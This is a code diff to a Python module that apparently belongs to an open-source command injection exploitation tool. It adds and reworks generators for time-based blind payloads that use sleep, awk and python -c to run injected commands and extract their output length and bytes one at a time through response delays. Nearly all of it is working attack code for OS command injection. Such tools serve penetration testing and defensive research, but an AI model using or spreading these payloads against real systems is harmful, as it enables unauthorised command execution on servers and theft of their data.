@@ -13,6 +13,8 @@ the Free Software Foundation, either version 3 of the License, or
 For more see the file 'readme/COPYING' for copying permission.
 """
 
+import re
+import random
 from src.utils import settings
 from src.core.controller import checks
 
@@ -38,6 +40,20 @@ def _length_expr(word):
   return "$(printf '%s' \"" + word + "\" | wc -c)"
 
 """
+The same count, handed to 'awk' as an argument instead of carried in a variable. A separator that
+backgrounds what it chains - '&' - cannot pass '${#var}' on to the command after it, and the two
+ways around that both reach for an operator the payload is not proving: '&&' to hold the variable,
+or a pipe into 'wc'. Asked this way the whole measurement is one command, so nothing is chained at
+all. Counted in characters, as '${#var}' counts, so the branches that use either agree.
+
+Nesting one substitution inside another is what this costs, which backticks cannot express without
+escaping - so the caller keeps to its own shape where those are in play.
+"""
+def _length_arg_expr(word):
+  return (settings.CMD_SUB_PREFIX + "awk 'BEGIN{print(length(ARGV[1]))}' \"" + word + "\"" +
+          settings.CMD_SUB_SUFFIX)
+
+"""
 The ordinal of the output's Nth byte, newlines counted among them. 'cut -c' would answer per line
 instead, which is a different byte on any output that has more than one - and none at all for the
 lines that are shorter than N.
@@ -52,34 +68,84 @@ def _ordinal_expr(word, num_of_chars):
           " | head -c 1" + settings.END_LINE.LF + "printf X)\")")
 
 """
-The command's output, measured by the alternative interpreter. The output travels through a pipe
-rather than into the program's own source: substituted there, a quote in it would close the string
-literal it sits in and the payload would come back at once, having measured nothing.
+The interpreter reads the output as an argument of its own rather than off a pipe. It is still data
+either way - never text spliced into the program's own source, so a quote in it closes nothing -
+and a pipe would be an operator the payload is not proving. The program's own statements are parted
+by a carriage return, which the interpreter reads as a line break and a filter does not read at all.
+
+'os.fsencode' puts the bytes back exactly as they arrived, surrogates and all, so this counts the
+same bytes the pipe did - and the same ones the ordinal below indexes.
+"""
+def _py_source(statements):
+  return "\"" + settings.END_LINE.CR.join(statements) + "\""
+
+def _py_call(cmd, statements):
+  return (settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c " +
+          _py_source(statements) + " \"" + _output_word(cmd) + "\"" + settings.CMD_SUB_SUFFIX)
+
+"""
+The command's output, measured by the alternative interpreter.
 """
 def _py_length_expr(cmd):
-  return (settings.CMD_SUB_PREFIX + "printf '%s' \"" + _output_word(cmd) + "\"|" +
-          settings.LINUX_PYTHON_INTERPRETER +
-          " -c \"import sys;print(len(sys.stdin.buffer.read()))\"" + settings.CMD_SUB_SUFFIX)
+  return _py_call(cmd, ("import os,sys", "print(len(os.fsencode(sys.argv[1])))"))
 
 """
-The command's output, saved to a file by the alternative interpreter - the tempfile-based technique's
-own write step. Piped in the same way _py_length_expr is and for the same reason: the output is data
-read off a stream, never text spliced into the program's own source, so nothing in it can break out
-of a literal or be misread as code.
+The command's output, saved to a file by the alternative interpreter - the tempfile-based
+technique's own write step.
 """
 def _py_write_expr(cmd, output_file):
-  return (settings.CMD_SUB_PREFIX + "printf '%s' \"" + _output_word(cmd) + "\"|" +
-          settings.LINUX_PYTHON_INTERPRETER + " -c \"import sys;open('" + output_file +
-          "','wb').write(sys.stdin.buffer.read())\"" + settings.CMD_SUB_SUFFIX)
+  return _py_call(cmd, ("import os,sys",
+                        "open('" + output_file + "','wb').write(os.fsencode(sys.argv[1]))"))
 
 """
-The ordinal of that output's Nth byte, read the same way. Indexing bytes answers with the number
-itself, so nothing has to be converted afterwards.
+The ordinal of that output's Nth byte. Indexing bytes answers with the number itself, so nothing
+has to be converted afterwards.
 """
 def _py_ordinal_expr(cmd, num_of_chars):
-  return (settings.CMD_SUB_PREFIX + "printf '%s' \"" + _output_word(cmd) + "\"|" +
-          settings.LINUX_PYTHON_INTERPRETER + " -c \"import sys;print(sys.stdin.buffer.read()[" +
-          str(num_of_chars - 1) + "])\"" + settings.CMD_SUB_SUFFIX)
+  return _py_call(cmd, ("import os,sys",
+                        "print(os.fsencode(sys.argv[1])[" + str(num_of_chars - 1) + "])"))
+
+"""
+The ordinal of that output's Nth byte, taken by awk as an argument rather than off two pipes. Read
+the same way as the count beside it, so the position asked for is the position indexed.
+
+A letter is concatenated onto the byte, and only the first of the two is read: a substitution drops
+the newlines it ends with, so a byte that is itself a newline would otherwise come back as nothing.
+The parentheses stand in for the space awk's own concatenation would need, which the whitespace
+substitution would eat inside the quoted program.
+"""
+def _ordinal_arg_expr(word, num_of_chars):
+  byte = (settings.CMD_SUB_PREFIX + "awk 'BEGIN{print((substr(ARGV[1]," + str(num_of_chars) +
+          ",1))(\"X\"))}' \"" + word + "\"" + settings.CMD_SUB_SUFFIX)
+  return settings.CMD_SUB_PREFIX + "printf '%d' \"'" + byte + "\"" + settings.CMD_SUB_SUFFIX
+
+"""
+The same condition written as arithmetic, or nothing where it is not one 'test' comparison of
+numbers - which is all a payload builds, and all that can be scaled into a delay without a branch.
+"""
+_TEST_TO_ARITHMETIC = ((" -eq ", "=="), (" -ne ", "!="), (" -le ", "<="),
+                       (" -lt ", "<"), (" -ge ", ">="), (" -gt ", ">"))
+
+def _arithmetic_condition(condition):
+  expression = condition
+  for test_form, arithmetic in _TEST_TO_ARITHMETIC:
+    expression = expression.replace(test_form, arithmetic)
+  return expression if re.match(r"\A[\d\s<>=!]+\Z", expression) else None
+
+"""
+The whole measurement as one command: the delay is scaled by the comparison itself, so there is
+nothing to chain and no operator beyond the separator under test ever reaches the payload. This is
+what the ';' and newline branches already say with a variable between two commands - written here
+without one, for the separators that cannot carry a variable from one command to the next.
+"""
+def _timed_comparison(timesec, expected, length_expr, comparison="=="):
+  return ("sleep $((" + str(timesec) + "*(" + str(expected) + comparison + length_expr + ")))")
+
+# The same, delayed by the alternative interpreter rather than by 'sleep'.
+def _py_timed_comparison(timesec, expected, length_expr, comparison="=="):
+  delay = "time.sleep($((" + str(timesec) + "*(" + str(expected) + comparison + length_expr + "))))"
+  return (settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c " +
+          _py_source(("import time", delay)) + settings.CMD_SUB_SUFFIX)
 
 """
 Time-based decision payload (check if host is vulnerable).
@@ -111,9 +177,24 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                  )
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      """
+      Measured and delayed on in the one command, so neither of these has to chain anything.
+
+      A number read straight back, rather than the length of the marker: the shell has to run the
+      substitution for the two sides to match, which is what the length check proved too, and this
+      asks nothing of the target beyond its own 'echo'. Detection is where that matters - a shell
+      without 'awk' would otherwise answer nothing here, and answering nothing reads as not
+      injectable rather than as a tool that could not ask.
+      """
+      marker = random.randint(10000, 99999)
+      payload = (separator +
+                 "sleep $((" + str(timesec) + "*(" + str(marker) + "==" +
+                 _output_word("echo " + str(marker)) + ")))"
+                 )
     elif separator == "&":
-      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
-      # would bring in an operator the separator under test is not the one for.
+      # Backticks cannot nest, so the measurement is carried in a variable here - which '&' cannot
+      # hand on to the command after it, leaving the '&&' below to hold it.
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + "&&" +
                  "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
@@ -162,6 +243,9 @@ def decision_alter_interpreter(separator, TAG, output_length, timesec, http_requ
                  settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                  )
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _py_timed_comparison(timesec, output_length,
+                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len('" + TAG + "'))\"" + settings.CMD_SUB_SUFFIX)
     elif separator == "&":
       payload = (separator +
                  # Find the length of the output, using readline().
@@ -222,6 +306,9 @@ def condition_check(separator, condition, timesec, http_request_method):
               settings.RANDOM_VAR_GENERATOR + "=$?" + separator +
               "sleep $((" + str(timesec) + "*(" + settings.RANDOM_VAR_GENERATOR + "==0)))"
               )
+  elif separator in ("&", "&&") and not settings.USE_BACKTICKS \
+       and _arithmetic_condition(condition) is not None:
+    payload = separator + "sleep $((" + str(timesec) + "*(" + _arithmetic_condition(condition) + ")))"
   elif separator == "&":
     payload = (separator +
               "[ " + condition + " ]" + "&&" +
@@ -276,6 +363,8 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
 
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _timed_comparison(timesec, output_length, _length_arg_expr(word))
     elif separator == "&":
       # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
       # would bring in an operator the separator under test is not the one for.
@@ -327,6 +416,8 @@ def cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http
                  settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(output_length) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                  )
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _py_timed_comparison(timesec, output_length, _py_length_expr(cmd))
     elif separator == "&":
       payload = (separator +
                  # Find the length of the output, using readline().
@@ -379,6 +470,8 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
                  "sleep $((" + str(timesec) + "*(" + str(candidate_length) + "<=$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
 
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _timed_comparison(timesec, candidate_length, _length_arg_expr(word), "<=")
     elif separator == "&":
       # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
       # would bring in an operator the separator under test is not the one for.
@@ -428,6 +521,8 @@ def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http
                  settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(candidate_length) + "<=${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                  )
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _py_timed_comparison(timesec, candidate_length, _py_length_expr(cmd), "<=")
     elif separator == "&":
       payload = (separator +
                  "[ " + str(candidate_length) + " -le " + _py_length_expr(cmd) + " ]" + "&&" +
@@ -489,6 +584,9 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + var_ordinal_expr + ")))"
                 )
 
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _timed_comparison(timesec, ascii_char,
+                  _ordinal_arg_expr(word, num_of_chars), arith_operator)
     elif separator == "&":
       # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
       # would bring in an operator the separator under test is not the one for.
@@ -548,6 +646,9 @@ def get_char_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                  )
 
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _py_timed_comparison(timesec, ascii_char,
+                  _py_ordinal_expr(cmd, num_of_chars), arith_operator)
     elif separator == "&":
       payload = (separator +
                  "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + _py_ordinal_expr(cmd, num_of_chars) + " ]" + "&&" +
@@ -597,6 +698,9 @@ def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timese
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                  )
 
+    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+      payload = separator + _py_timed_comparison(timesec, ascii_char,
+                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX)
     elif separator == "&":
       payload = (separator +
                  "[ " + str(ascii_char) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
